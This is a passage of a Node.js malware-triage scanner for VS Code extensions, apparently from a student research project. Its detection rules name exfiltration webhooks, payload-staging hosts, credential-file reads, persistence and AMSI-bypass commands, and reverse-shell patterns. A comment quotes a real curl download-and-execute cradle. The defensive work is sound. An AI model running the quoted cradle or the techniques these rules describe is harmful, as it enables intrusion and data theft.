#!/usr/bin/env node
'use strict';
/**
 * preprocess.js — Static Pre-processing / Pre-filter (pre-execution triage) v3
 * ============================================================================
 * Static stage that runs FIRST: it unpacks the package, DE-OBFUSCATES every
 * text file, parses it to an AST where possible, and scans for malware
 * indicators. The dynamic sandbox observes runtime behaviour; this stage
 * catches payloads the sandbox never reaches (trojanised node_modules,
 * dormant/gated code, obfuscation).
 *
 * ── WHAT CHANGED IN v3 ──────────────────────────────────────────────────────
 *
 * FALSE POSITIVES (v2 shipped 5 on a 49-extension benign set — every one of
 * them a "download-and-execute cradle" that was nothing of the sort):
 *
 *   • CRADLE DETECTION IS NOW LITERAL-SCOPED. v2 asked "is there a LOLBIN
 *     keyword within 150 characters of a URL?", which fires on any minified
 *     bundle where `curl` appears in a doc-comment near an unrelated https://
 *     link (todo-tree, material-icon-theme, code-runner, code-spell-checker).
 *     v3 parses the file and requires the LOLBIN **and** the fetch target to
 *     live inside the SAME STRING LITERAL — i.e. inside one actual command
 *     string. That is what a real cradle looks like, and it still catches the
 *     obfuscated ETHCode payload, whose decoder array holds the whole command
 *     `… & curl.exe -k -L -Ss "https://files.catbox.moe/nucjfz.bat" -o $o; & $o`
 *     in one element.
 *
 *   • eval() IS JUDGED BY ARGUMENT SHAPE, not by its name. `eval("(" + json + ")")`
 *     (the hand-rolled JSON parse), `eval` of a static literal, and feature-probe
 *     evals are ignored. Only eval / new Function over a DECODED or CONSTRUCTED
 *     value (base64, atob, decipher, a network response, a joined char array)
 *     is flagged.
 *
 *   • fs WRITES ARE JUDGED BY DESTINATION. Writing inside the extension's own
 *     folder, the OS temp dir, globalStorage or a .vscode dir is normal tooling
 *     behaviour and is ignored. Writing an EXECUTABLE (.exe/.dll/.scr/.bat/.ps1/
 *     .vbs/.cmd), or writing into an autostart location, is not.
 *
 *   • GENERIC behavioural markers (child_process, raw socket, secret reads,
 *     installExtension) remain scanned ONLY in the extension's OWN code, never
 *     in node_modules — otherwise every language extension trips.
 *
 * FALSE NEGATIVES (v2 recall was 40%):
 *
 *   • Expanded IOC families: Discord/Slack webhooks, Telegram bot API, Solana
 *     RPC, Google Calendar/Sheets abused as C2, LOLBIN encoded commands
 *     (`powershell -enc`, `certutil -decode|-urlcache`), reverse shells
 *     (net.Socket ⨯ child_process), download-to-temp-then-execute, autostart
 *     persistence, Defender/AMSI evasion, javascript-obfuscator string arrays,
 *     clipboard wallet-swapping, and host-fingerprint harvesting.
 *
 *   • HOST IOCs stay scanned EVERYWHERE, incl. node_modules — that is how the
 *     ETHCode trojan hidden in `keythereum-utils` is caught.
 *
 * Invisible-Unicode detection counts ONLY the GlassWorm encoding ranges
 * U+E0000–E007F (tags) and U+E0100–E01EF (variation-selectors supplement); it
 * deliberately EXCLUDES emoji selectors, ZWJ, bidi marks and zero-width spaces,
 * which appear in legitimate code constantly.
 *
 * Usage:
 *   node preprocess.js <.vsix | extension dir | dataset-root> [--csv out.csv] [--json]
 *
 * Writes static-analysis.json next to the analysed package and prints a verdict.
 * Project: CSN 304 — "Towards Identifying Malicious VS Code Extensions"
 */

const fs   = require('fs');
const path = require('path');
const os   = require('os');
const { extractVsix } = require('./zip-util');

const MAX_FILE_BYTES  = 2.0 * 1024 * 1024;
const MAX_TOTAL_BYTES = 80  * 1024 * 1024;
const MAX_FILES       = 8000;
const TEXT_EXT        = /\.(js|cjs|mjs|jsx|ts|tsx|json|sh|ps1|bat|cmd|py|vbs)$/i;
const JS_EXT          = /\.(js|cjs|mjs)$/i;

// AST parsing (optional dependency — the regex layer still applies without it).
let acorn = null;
try { acorn = require('acorn'); } catch (_) { /* optional */ }

// ═════════════════════════════════════════════════════════════════════════════
//  RULE SETS
// ═════════════════════════════════════════════════════════════════════════════

// ── HIGH-CONFIDENCE host/string IOCs — safe to scan everywhere (incl node_modules)
//    These strings essentially never occur in legitimate extension code.
const HOST_IOCS = [
  [/ngrok|trycloudflare|\.tcp\.\w|loca\.lt|serveo\.net|localtunnel|\.ngrok-free\.app|pinggy\.io/i, 50,
   'tunnelled C2 endpoint (ngrok / cloudflare / tcp tunnel)'],
  [/catbox\.moe|pastebin\.com\/raw|paste\.ee|0x0\.st|transfer\.sh|anonfiles|tmpfiles\.org|gofile\.io|file\.io|bashupload/i, 45,
   'anonymous file-drop host (payload staging)'],
  [/discord(?:app)?\.com\/api\/webhooks|ptb\.discord\.com\/api\/webhooks|hooks\.slack\.com\/services/i, 45,
   'chat-app webhook used for exfiltration (Discord / Slack)'],
  [/api\.telegram\.org\/bot|t\.me\/[A-Za-z0-9_]{5,}\?|sendMessage\?chat_id=/i, 45,
   'Telegram bot API used as a C2 / exfiltration channel'],
  [/https?:\/\/[a-z0-9.-]*(?:herokuapp\.com|elasticbeanstalk|pythonanywhere\.com|onrender\.com|workers\.dev|\.repl\.co|glitch\.me|railway\.app|fly\.dev|ngrok\.io)/i, 30,
   'ephemeral/free cloud backend endpoint (C2 staging)'],
  [/function\.undefined|\.undefined\d|undefined\d+\.com/i, 35,
   'auto-generated throwaway C2 domain'],
  [/www\.googleapis\.com\/calendar\/v3\/calendars\/[^\s"']+\/events|sheets\.googleapis\.com\/v4\/spreadsheets\/[^\s"']+\/values/i, 45,
   'Google Calendar / Sheets API abused as a dead-drop C2 channel'],
  [/stratum\+tcp:\/\/|xmrig|minexmr|supportxmr|nanopool\.org|c3pool|cryptonight/i, 50,
   'crypto-mining pool / miner binary reference'],
];

// ── SOLANA / blockchain C2 — real Solana tooling exists, so this alone is only
//    SUSPICIOUS; the combination rules below escalate it.
const CHAIN_IOCS = [
  [/mainnet-beta\.solana|api\.devnet\.solana|api\.mainnet-beta|helius-rpc\.com|quicknode\.pro/i, 30,
   'Solana RPC endpoint (used by some malware as decentralized C2)'],
];

// ── GENERIC IOCs — scanned ONLY in the extension's own (non-node_modules) code
const APP_IOCS = [
  [/https?:\/\/(?!127\.|10\.|192\.168\.|0\.|169\.254\.|255\.|localhost|1\.1\.1\.1|8\.8\.8\.8|8\.8\.4\.4)\d{1,3}(?:\.\d{1,3}){3}/, 40,
   'hard-coded raw public IP endpoint'],
  [/workbench\.extensions\.installExtension/i, 25,
   'programmatically installs a VSIX (marketplace bypass)'],
  [/(?:readFileSync|readFile|createReadStream)\s*\([^)]{0,60}(?:\.ssh[\/\\]|id_rsa|\.aws[\/\\]credentials|wallet\.json|keystore|Login Data|Local State|logins\.json|key4\.db|\.npmrc|\.env['"`])/i, 30,
   'reads credential / wallet / browser-secret files'],
  [/\b(?:reg(?:\.exe)?\s+add\s+[^\n"']{0,80}(?:CurrentVersion\\\\?Run|Run\b)|schtasks\s+\/create|New-ItemProperty[^\n]{0,80}CurrentVersion|Start(?:up)?\s+Menu[\\\/]+Programs[\\\/]+Startup)/i, 35,
   'Windows autostart persistence (Run key / scheduled task / Startup folder)'],
  [/\b(?:crontab\s+-|LaunchAgents[\/\\]|systemctl\s+--user\s+enable|>>\s*~\/\.(?:bashrc|zshrc|profile))/i, 35,
   '*nix persistence (cron / LaunchAgent / shell-rc implant)'],
  [/Add-MpPreference\s+-ExclusionPath|Set-MpPreference\s+-Disable|amsiInitFailed|AmsiScanBuffer|Disable-WindowsOptionalFeature[^\n]{0,40}Defender/i, 50,
   'security-product evasion (Defender exclusion / AMSI bypass)'],
  [/vscode\.env\.machineId|env\.machineId|os\.networkInterfaces\s*\(\)[^\n]{0,120}(?:mac|MAC)/, 25,
   'harvests a stable host fingerprint (machineId / MAC address)'],
  [/clipboard\.readText\s*\([^\n]{0,200}(?:0x[a-fA-F0-9]{40}|\b1[A-HJ-NP-Za-km-z1-9]{25,34}\b|bc1[a-z0-9]{20,})/, 45,
   'clipboard hijack (reads clipboard and matches wallet addresses)'],
];

// ── Download-and-execute cradle detection ────────────────────────────────────
//  A cradle is not "a LOLBIN name appears somewhere near a URL" — that fires on
//  build scripts (`curl -s https://…/mapping.json`), on VS Code's own language-ID
//  list (which contains the word "powershell" and the token ".bat"), and on any
//  path string mentioning powershell.exe. A cradle is one command string that
//  does all THREE of: invoke an interpreter/downloader, name a remote payload,
//  and then RUN what it fetched. All three are required.
const LOLBIN_RE = /\b(?:powershell(?:\.exe)?|pwsh|cmd(?:\.exe)?\s*\/c|certutil(?:\.exe)?|bitsadmin|mshta|regsvr32|rundll32|wscript|cscript|curl(?:\.exe)?|wget|Invoke-WebRequest|iwr|Invoke-Expression|iex|DownloadString|DownloadFile|Start-Process)\b/i;

/** A remote payload reference: a URL, or a script/binary sitting on a path. */
const PAYLOAD_RE = /https?:\/\/\S+|[\/\\$%][\w$%.\\\/-]*\.(?:bat|ps1|hta|scr|vbs|cmd|exe|dll|jar|py|sh)\b/i;

/** Evidence that the fetched artefact is then EXECUTED, not merely downloaded. */
const EXEC_CHAIN_RE = new RegExp([
  '\\|\\s*(?:sh|bash|zsh|iex|Invoke-Expression|powershell|node|python\\d?)\\b', // curl … | sh
  ';\\s*&\\s*[$"\'\\w]',                                                        // …; & $o
  '&&\\s*(?:start|\\.\\/|cmd|powershell|sh\\b|bash\\b)',                        // … && start x
  '\\b(?:iex|Invoke-Expression)\\s*[\\(("\']',                                  // iex (New-Object …)
  '\\bStart-Process\\b',
  '-(?:o|OutFile|Output)\\s+\\S+\\s*[;&]',                                      // -o $o ; & $o
  '\\b(?:mshta|regsvr32|rundll32|wscript|cscript|certutil)\\b[^\\n]{0,80}https?://', // LOLBIN runs a URL directly
  '\\bbitsadmin\\b[^\\n]{0,80}/transfer',
].join('|'), 'i');

const ENCODED_CMD_RE = /(?:powershell|pwsh)(?:\.exe)?[^\n]{0,60}\s-(?:e|en|enc|ec|encodedcommand)\s+[A-Za-z0-9+/=]{40,}|certutil(?:\.exe)?\s+(?:-decode|-urlcache|-f\s+-decode)/i;

// ── Remote binary fetch ──────────────────────────────────────────────────────
//  A URL whose path ends in an executable is a payload URL — UNLESS it points at
//  a well-known distribution host, because legitimate extensions genuinely
//  download language-server binaries from GitHub Releases / npm / vendor CDNs.
const REMOTE_BINARY_URL_RE = /https?:\/\/([a-z0-9.\-]+)(?::\d+)?\/[^\s"'`<>()]*\.(?:exe|dll|scr|msi|bat|cmd|ps1|vbs|hta|jar)\b/ig;
const TRUSTED_BINARY_HOSTS = /(?:^|\.)(?:github\.com|githubusercontent\.com|github\.io|gitlab\.com|npmjs\.org|npmjs\.com|jsdelivr\.net|unpkg\.com|microsoft\.com|visualstudio\.com|vsassets\.io|azureedge\.net|nodejs\.org|python\.org|golang\.org|go\.dev|rust-lang\.org|oracle\.com|adoptium\.net|apache\.org|eclipse\.org|jetbrains\.com|mozilla\.org|google\.com|googleapis\.com|gstatic\.com|cloudflare\.com|sourceforge\.net|bitbucket\.org|dl\.google\.com)$/i;

// ── Host-enumeration commands ────────────────────────────────────────────────
//  Split by how much INTENT each group carries. Network enumeration on its own
//  is not evidence: the `systeminformation` npm package (bundled by TabNine and
//  many telemetry-collecting extensions) legitimately shells out to
//  `ipconfig /all`, `netstat` and `ifconfig`. Enumerating ACCOUNTS and
//  PRIVILEGES is a different matter — no editor extension needs `net user`,
//  `whoami /priv` or `/etc/passwd`. So a battery only counts when at least one
//  identity-level command is in it.
const RECON_IDENTITY = [
  /\bnet\s+user\b/i, /\bnet\s+localgroup\b/i, /\bwhoami\s+\/(?:priv|all|groups)\b/i,
  /\bcat\s+\/etc\/passwd\b/i, /\bgetent\s+passwd\b/i, /\bcut\s+-d:\s*-f1\s+\/etc\/group\b/i,
  /\bdscl\s+\.\s+-list\b/i, /\bsecurity\s+find-generic-password\b/i, /\bqwinsta\b/i,
  /\bnltest\b/i, /\bcrontab\s+-l\b/i, /\bnet\s+share\b/i,
];
const RECON_SYSTEM = [
  /\btasklist\b/i, /\bsysteminfo\b/i, /\bps\s+aux\b/i, /\bwmic\s+\w+/i, /\bGet-Process\b/i,
];
const RECON_NETWORK = [
  /\bipconfig\s+\/all\b/i, /\bnetstat\s+-[a-z]*n/i, /\bifconfig\b/i, /\barp\s+-a\b/i,
  /\broute\s+print\b/i, /\blsof\s+-i\b/i,
];

/** Execution verbs available inside a batch/shell/PowerShell script. */
const SCRIPT_EXEC_VERB_RE = /\bstart\s+(?:""\s+)?(?:\/[bB]\s+)?["'%$]|\bstart\s+""|\bcall\s+[%"']|\bStart-Process\b|\bInvoke-Expression\b|\biex\b|\|\s*(?:sh|bash|iex)\b|&&\s*\.\//i;

/**
 * Expand `set "X=Y"` / `X=Y` / `$X = "Y"` assignments inside a shell, batch or
 * PowerShell script so that a cradle split across lines through variables
 * (the QuantumCodeLabs `run.bat` shape) becomes visible as one command chain.
 */
function expandScriptVars(text) {
  const vars = new Map();
  const grab = (re, ki, vi) => {
    let m; re.lastIndex = 0;
    while ((m = re.exec(text)) !== null && vars.size < 200) vars.set(m[ki].toUpperCase(), m[vi]);
  };
  grab(/^\s*set\s+"?([A-Za-z_]\w*)=([^"\r\n]*)"?\s*$/gim, 1, 2);   // batch:  set "X=Y"
  grab(/^\s*\$([A-Za-z_]\w*)\s*=\s*["']([^"'\r\n]*)["']/gim, 1, 2); // pwsh:   $X = "Y"
  grab(/^\s*(?:export\s+)?([A-Za-z_]\w*)=["']?([^"'\s\r\n]*)["']?\s*$/gim, 1, 2); // sh: X=Y

  let out = text;
  for (let pass = 0; pass < 3; pass++) {                            // resolve nesting
    let changed = false;
    out = out.replace(/%([A-Za-z_]\w*)%|\$\{?([A-Za-z_]\w*)\}?/g, (whole, a, b) => {
      const v = vars.get(String(a || b).toUpperCase());
      if (v === undefined) return whole;
      changed = true;
      return v;
    });
    if (!changed) break;
  }
  return out;
}

/**
 * Does one command string constitute a download-and-execute cradle?
 * The LOLBIN's own image name (`powershell.exe`, `curl.exe`) is stripped before
 * looking for the payload, so `"C:\…\powershell.exe"` cannot self-satisfy the
 * payload requirement.
 */
function isCradleLiteral(lit) {
  if (!lit || lit.length > 4000) return false;
  if (!LOLBIN_RE.test(lit)) return false;
  if (!EXEC_CHAIN_RE.test(lit)) return false;
  const stripped = lit.replace(/\b(?:powershell|pwsh|cmd|certutil|curl|wget|mshta|regsvr32|rundll32|wscript|cscript|bitsadmin)\.exe\b/gi, '');
  return PAYLOAD_RE.test(stripped);
}

// ── Executable / autostart write destinations (used by the AST write rule).
const EXECUTABLE_WRITE_RE = /\.(?:exe|dll|scr|msi|bat|cmd|ps1|vbs|jar|lnk)(?:["'`]|$)/i;
const AUTOSTART_WRITE_RE  = /(?:Start(?:up)?[\\\/]+Menu|[\\\/]Startup[\\\/]|LaunchAgents|\.config[\\\/]autostart|init\.d|systemd[\\\/]user)/i;
/** Destinations a normal extension legitimately writes to. */
const SAFE_WRITE_RE = /(?:tmpdir\(\)|os\.tmpdir|globalStorage|storageUri|storagePath|logPath|logUri|extensionPath|extensionUri|__dirname|context\.(?:global|workspace)State|\.vscode[\\\/]|node_modules[\\\/]|\.cache[\\\/])/i;

// ═════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═════════════════════════════════════════════════════════════════════════════

function safeReaddir(d) { try { return fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return []; } }

function unzip(vsixPath) {
  const tmp = path.join(os.tmpdir(), `vsix-pre-${path.basename(vsixPath).replace(/[^\w.-]/g, '_')}-${process.pid}-${Date.now()}`);
  extractVsix(vsixPath, tmp);
  return tmp;
}

function findExtRoot(root) {
  if (fs.existsSync(path.join(root, 'extension', 'package.json'))) return path.join(root, 'extension');
  if (fs.existsSync(path.join(root, 'package.json'))) return root;
  for (const e of safeReaddir(root)) {
    if (e.isDirectory()) {
      const d = path.join(root, e.name);
      if (fs.existsSync(path.join(d, 'extension', 'package.json'))) return path.join(d, 'extension');
      if (fs.existsSync(path.join(d, 'package.json'))) return d;
    }
  }
  return root;
}

/** Reveal hidden text: decode \xNN / \uNNNN escapes and embedded base64 blobs. */
function deobfuscate(src) {
  let out = src;
  out += '\n' + src.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
                   .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
  const blobs = src.match(/[A-Za-z0-9+/]{40,}={0,2}/g) || [];
  for (const b of blobs.slice(0, 60)) {
    try {
      const d = Buffer.from(b, 'base64').toString('utf8');
      if (/[ -~]/.test(d) && /[a-zA-Z]{4}/.test(d) && d.replace(/[^\x20-\x7e]/g, '').length > d.length * 0.7) out += '\n' + d;
    } catch (e) {}
  }
  return out;
}

/**
 * Count GlassWorm-style invisible encoding codepoints:
 *   U+E0000–U+E007F (Tags) and U+E0100–U+E01EF (Variation Selectors Supp.)
 *
 * Counting every such codepoint (v2) produced false positives on two very
 * ordinary things:
 *   • Unicode DATA TABLES — `node_modules/unicode/category/Mn.js` enumerates
 *     every nonspacing mark, so it legitimately contains all 240 variation
 *     selectors, each ISOLATED between ASCII.
 *   • EMOJI TAG SEQUENCES — the England/Scotland/Wales flags are encoded as
 *     U+1F3F4 followed by tag letters and terminated by U+E007F. Any emoji
 *     dataset contains them.
 *
 * GlassWorm encodes a PAYLOAD: one invisible codepoint per byte, so the
 * codepoints appear in long CONTIGUOUS RUNS. We therefore count only runs of
 * ≥ MIN_RUN invisible codepoints, and discard runs that are valid emoji tag
 * sequences (introduced by U+1F3F4 and/or closed by U+E007F).
 */
const GLASSWORM_MIN_RUN = 4;

function glasswormUnicodeCount(src) {
  let total = 0, run = 0, runStartPrevCp = 0, sawCancelTag = false;

  const flushRun = () => {
    if (run >= GLASSWORM_MIN_RUN) {
      const isEmojiTagSeq = runStartPrevCp === 0x1F3F4 || (sawCancelTag && run <= 8);
      if (!isEmojiTagSeq) total += run;
    }
    run = 0; sawCancelTag = false;
  };

  let prevCp = 0;
  for (let i = 0; i < src.length; i++) {
    let cp = src.charCodeAt(i);
    if (cp >= 0xD800 && cp <= 0xDBFF && i + 1 < src.length) {
      const lo = src.charCodeAt(i + 1);
      if (lo >= 0xDC00 && lo <= 0xDFFF) { cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00); i++; }
    }
    const invisible = (cp >= 0xE0000 && cp <= 0xE007F) || (cp >= 0xE0100 && cp <= 0xE01EF);
    if (invisible) {
      if (run === 0) runStartPrevCp = prevCp;
      if (cp === 0xE007F) sawCancelTag = true;
      run++;
    } else flushRun();
    prevCp = cp;
  }
  flushRun();
  return total;
}

// ═════════════════════════════════════════════════════════════════════════════
//  AST LAYER
//  Regex/text matching over-flags: a static `execSync('git status')`, a
//  hand-rolled `eval('(' + json + ')')` and a doc-comment mentioning `curl`
//  look identical to a real payload in raw text. Parsing to an AST lets us
//  judge the SHAPE of a call and the CONTENTS of individual string literals.
//  Degrades gracefully to the regex layer when acorn is unavailable or the
//  source is deliberately unparseable.
// ═════════════════════════════════════════════════════════════════════════════

const CP_FUNCS   = new Set(['exec', 'execSync', 'spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork']);
const WRITE_FUNCS= new Set(['writeFile', 'writeFileSync', 'appendFile', 'appendFileSync', 'createWriteStream', 'copyFile', 'copyFileSync']);
/**
 * Calls whose RESULT is decoded ciphertext/compressed data. Feeding one of
 * these to eval() is the unambiguous multi-stage-loader shape.
 *
 * Deliberately NARROW. v3.0 also listed `join`, `from`, `decode`, `update`,
 * `final`, `reverse` and `fromCharCode`; those fire on ordinary bundler output
 * (`new Function("c","size", jsBuf.join(""))` in pdf.js, MobX's tracing
 * `new Function("debugger;…" + name)`) and produced five benign extensions
 * labelled MALICIOUS. A name must imply DECODING, not string building.
 */
const DECODER_NAMES = new Set(['atob', 'inflate', 'inflateSync', 'inflateRaw', 'inflateRawSync',
                               'gunzip', 'gunzipSync', 'brotliDecompress', 'brotliDecompressSync',
                               'createDecipheriv', 'createDecipher', 'decrypt', 'decipher']);

/** `Buffer.from(x, 'base64'|'hex')` — the other canonical decode shape. */
function isBufferDecode(node) {
  if (!node || node.type !== 'CallExpression') return false;
  const c = node.callee;
  if (!c || c.type !== 'MemberExpression') return false;
  if (!(c.object && c.object.name === 'Buffer' && c.property && c.property.name === 'from')) return false;
  const enc = node.arguments && node.arguments[1];
  return !!(enc && enc.type === 'Literal' && /^(base64|base64url|hex)$/i.test(String(enc.value)));
}

function parse(source) {
  if (!acorn || !source || source.length > MAX_FILE_BYTES) return null;
  for (const sourceType of ['module', 'script']) {
    try {
      return acorn.parse(source, {
        ecmaVersion: 'latest', sourceType,
        allowReturnOutsideFunction: true, allowAwaitOutsideFunction: true,
        allowHashBang: true, allowSuperOutsideMethod: true,
      });
    } catch (_) { /* try the other goal */ }
  }
  return null;
}

/** Dependency-free recursive AST walk (no acorn-walk needed). */
function walk(node, visit) {
  if (!node || typeof node.type !== 'string') return;
  visit(node);
  for (const k in node) {
    if (k === 'type' || k === 'start' || k === 'end' || k === 'loc' || k === 'range') continue;
    const v = node[k];
    if (Array.isArray(v)) { for (const c of v) walk(c, visit); }
    else if (v && typeof v.type === 'string') walk(v, visit);
  }
}

/** Resolve a call's callee to a bare name: eval(…) → 'eval'; cp.exec(…) → 'exec'. */
function calleeName(callee) {
  if (!callee) return '';
  if (callee.type === 'Identifier')       return callee.name;
  if (callee.type === 'MemberExpression') return (callee.property && callee.property.name) || '';
  return '';
}

/** Static value (safe) vs dynamic/tainted (variable, call, template with ${…})? */
function isStaticArg(node) {
  if (!node) return true;
  switch (node.type) {
    case 'Literal':          return true;
    case 'TemplateLiteral':  return node.expressions.length === 0;
    case 'BinaryExpression': return node.operator === '+' && isStaticArg(node.left) && isStaticArg(node.right);
    default:                 return false;
  }
}

/** Safe JSON-via-eval: eval("(…)") whose literal is a parenthesised object/array. */
function isSafeJsonEval(arg) {
  if (arg && arg.type === 'Literal' && typeof arg.value === 'string') {
    const t = arg.value.trim();
    return /^\(\s*[\[{]/.test(t) && /[\]}]\s*\)$/.test(t);
  }
  // eval("(" + json + ")") — concatenation whose outer ends are the parens.
  if (arg && arg.type === 'BinaryExpression' && arg.operator === '+') {
    const flat = [];
    (function flatten(n) {
      if (n.type === 'BinaryExpression' && n.operator === '+') { flatten(n.left); flatten(n.right); }
      else flat.push(n);
    })(arg);
    const first = flat[0], last = flat[flat.length - 1];
    const isParen = (n, ch) => n && n.type === 'Literal' && typeof n.value === 'string' && n.value.trim().startsWith(ch);
    const endsParen = (n, ch) => n && n.type === 'Literal' && typeof n.value === 'string' && n.value.trim().endsWith(ch);
    if (isParen(first, '(') && endsParen(last, ')')) return true;
  }
  return false;
}

/** Does this expression carry DECODED data (the multi-stage-loader shape)? */
function isDecodedExpression(node, depth = 0) {
  if (!node || depth > 4) return false;
  if (node.type === 'CallExpression') {
    if (isBufferDecode(node)) return true;
    const n = calleeName(node.callee);
    if (DECODER_NAMES.has(n)) return true;
    // Buffer.from(x,'base64').toString('utf8')
    if (n === 'toString' && node.callee.object) return isDecodedExpression(node.callee.object, depth + 1);
    return node.arguments.some((a) => isDecodedExpression(a, depth + 1));
  }
  if (node.type === 'MemberExpression') return isDecodedExpression(node.object, depth + 1);
  if (node.type === 'AwaitExpression')  return isDecodedExpression(node.argument, depth + 1);
  return false;
}

/**
 * Collect every string literal (and fully-static template) in the program.
 * Comments are NOT part of the AST, which is exactly why literal-scoped
 * matching removes the doc-comment false positives.
 */
function collectLiterals(ast) {
  const out = [];
  walk(ast, (n) => {
    if (n.type === 'Literal' && typeof n.value === 'string') out.push(n.value);
    else if (n.type === 'TemplateLiteral') out.push(n.quasis.map((q) => (q.value && q.value.cooked) || '').join('${}'));
  });
  return out;
}

/**
 * AST-driven findings for ONE source file.
 * @param {string} source
 * @param {boolean} isApp  false for node_modules (generic markers suppressed)
 * @returns {{findings:Array, literals:Array<string>|null, parsed:boolean}}
 */
function astScan(source, isApp) {
  const ast = parse(source);
  if (!ast) return { findings: [], literals: null, parsed: false };

  const out = new Map();                                   // reason → finding
  const flag = (pts, reason, detail) => { if (!out.has(reason)) out.set(reason, { points: pts, reason, detail }); };
  const literals = collectLiterals(ast);

  // ── Literal-scoped cradle: fetch AND execute inside the SAME command string.
  for (const lit of literals) {
    if (isCradleLiteral(lit)) {
      flag(55, 'download-and-execute cradle (one command string fetches a remote payload and runs it)',
           lit.replace(/\s+/g, ' ').slice(0, 200));
      break;
    }
  }
  for (const lit of literals) {
    if (ENCODED_CMD_RE.test(lit)) {
      flag(50, 'LOLBIN executing an encoded/decoded payload (powershell -enc / certutil -decode)',
           lit.replace(/\s+/g, ' ').slice(0, 200));
      break;
    }
  }

  walk(ast, (node) => {
    if (node.type !== 'CallExpression' && node.type !== 'NewExpression') return;
    const name = calleeName(node.callee);
    const a0   = node.arguments && node.arguments[0];

    // ── eval() / new Function() ────────────────────────────────────────────
    if (name === 'eval' || (node.type === 'NewExpression' && name === 'Function')) {
      const last = node.arguments[node.arguments.length - 1];
      if (isDecodedExpression(last) || isDecodedExpression(a0)) {
        // In the extension's OWN code this is decisive. Inside node_modules it
        // is common enough in source-map / wasm loaders that it is only a hint;
        // a genuinely trojanised dependency is caught by the obfuscation rule.
        if (isApp) flag(45, 'AST: eval()/new Function() over DECODED data (base64/decipher/inflate) — multi-stage loader');
        else       flag(15, 'AST: dependency eval()/new Function() over decoded data');
      } else if (isApp && !(isSafeJsonEval(a0) || isStaticArg(a0))) {
        flag(12, 'AST: dynamic eval()/new Function() on a constructed (non-static) value');
      }
      // Static / JSON-parse forms are deliberately silent — this is the fix for
      // the `eval("(" + json + ")")` false positive.
      return;
    }

    // ── Embedded encrypted payload ─────────────────────────────────────────
    // `crypto.createDecipheriv('aes-256-cbc', '<32-char literal key>', …)` —
    // a HARDCODED key sitting next to its ciphertext is a packer, not
    // cryptography: real code derives or fetches keys, it does not ship them.
    if (name === 'createDecipheriv' || name === 'createDecipher') {
      const key = node.arguments && node.arguments[1];
      const keyLiteral = key && ((key.type === 'Literal' && typeof key.value === 'string' && key.value.length >= 16)
                              || isBufferDecode(key));
      if (keyLiteral && a0 && a0.type === 'Literal') {
        flag(45, 'runtime-decrypts an embedded payload with a hard-coded key (packed second stage)',
             String(a0.value).slice(0, 60));
      }
    }

    if (!isApp) return;                          // generic markers: app code only

    // ── Reverse shell, structurally ────────────────────────────────────────
    // `socket.on('data', d => child_process.exec(d))` — a stream handler whose
    // body executes a process. This is the actual wiring of a reverse shell,
    // as opposed to "this bundle happens to contain both net and
    // child_process", which is true of every language-server client.
    if (name === 'on' && a0 && a0.type === 'Literal' && /^(data|message)$/.test(String(a0.value))) {
      const handler = node.arguments[1];
      if (handler && /Function/.test(handler.type)) {
        let execsInside = false;
        walk(handler.body, (n) => {
          if ((n.type === 'CallExpression' || n.type === 'NewExpression') && CP_FUNCS.has(calleeName(n.callee))) execsInside = true;
        });
        if (execsInside) flag(55, 'AST: reverse shell — a socket data handler executes received input as a process');
      }
    }

    // ── child_process.* ────────────────────────────────────────────────────
    if (CP_FUNCS.has(name)) {
      if (isDecodedExpression(a0)) {
        flag(50, 'AST: child_process executing a DECODED command string');
      } else if (!isStaticArg(a0)) {
        // Deliberately ONE reason for all of exec/spawn/execFile/fork: every
        // dev-tool extension builds its command line dynamically, so this is a
        // capability note, not evidence. Counting it once per function name is
        // what let benign language servers accumulate a "malicious" score.
        flag(12, 'AST: child_process invoked with a non-static/tainted command argument');
      }
      // A static command is normal tooling (`git status`, `node --version`).
      return;
    }

    // ── fs writes — judged by DESTINATION, not by the fact a write happened ─
    if (WRITE_FUNCS.has(name) && a0) {
      const dest = a0.type === 'Literal' ? String(a0.value)
                 : a0.type === 'TemplateLiteral' ? a0.quasis.map((q) => (q.value && q.value.cooked) || '').join('${}')
                 : src(a0, source);
      if (AUTOSTART_WRITE_RE.test(dest)) {
        flag(45, 'AST: writes into an autostart/persistence location', dest.slice(0, 160));
      } else if (EXECUTABLE_WRITE_RE.test(dest) && !SAFE_WRITE_RE.test(dest)) {
        flag(35, 'AST: writes an executable/script payload to disk', dest.slice(0, 160));
      } else if (EXECUTABLE_WRITE_RE.test(dest)) {
        flag(15, 'AST: writes an executable payload into a temp/extension directory', dest.slice(0, 160));
      }
      // Writes to temp / globalStorage / the extension dir are ignored entirely
      // — this is the fix for the "valid file write" false positive.
      return;
    }
  });

  return { findings: [...out.values()], literals, parsed: true };
}

/** Raw source text for a node (used when a write destination is an expression). */
function src(node, source) {
  try { return source.slice(node.start, Math.min(node.end, node.start + 300)); } catch (_) { return ''; }
}

// ═════════════════════════════════════════════════════════════════════════════
//  TREE WALK + SCAN
// ═════════════════════════════════════════════════════════════════════════════

function scanTree(extRoot) {
  const findings = [];
  const add = (pts, reason, file, detail) =>
    findings.push({ points: pts, reason, file: path.relative(extRoot, file) || '.', detail: detail || undefined });

  let scannedFiles = 0, scannedBytes = 0, invisibleTotal = 0, parsedFiles = 0;
  let appCodeBytes = 0, appHasRealLogic = false;
  const seen = new Set();                     // de-dupe findings across files
  const once = (pts, reason, file, detail) => { if (!seen.has(reason)) { seen.add(reason); add(pts, reason, file, detail); } };

  const REAL_LOGIC = /require\(['"](?:fs|net|https?|child_process|crypto|axios|dns|os|node-fetch)['"]\)|\bfetch\s*\(|\beval\s*\(|new\s+Function|createWriteStream/;
  const SOCK = /new\s+net\.Socket|net\.createConnection|net\.connect\s*\(/i;
  const EXEC = /child_process|\.execSync\(|\.spawnSync\(|child_process\.(?:exec|spawn|execFile|fork)/i;
  const SHELL_BIN = /['"`](?:\/bin\/(?:sh|bash|zsh|dash)|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)['"`]|['"`]\/bin\/sh['"`]/i;
  const OBFUSCATOR = /var\s+_0x[a-f0-9]{4,}\s*=|function\s+_0x[a-f0-9]{4,}\s*\(/;
